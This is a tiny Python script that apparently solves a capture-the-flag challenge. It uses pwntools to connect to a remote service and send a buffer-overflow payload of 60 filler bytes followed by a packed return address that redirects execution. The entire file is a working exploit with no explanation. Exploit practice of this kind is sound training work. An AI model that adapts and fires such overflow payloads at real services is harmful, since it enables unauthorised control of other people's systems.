# coding: utf-8
from pwn import *
p = remote("thekidofarcrania.com", 4902)
p.recv()
payload = b"a" * 60 + p32(0x08048586)
p.sendline(payload)
p.recv()
p.close()
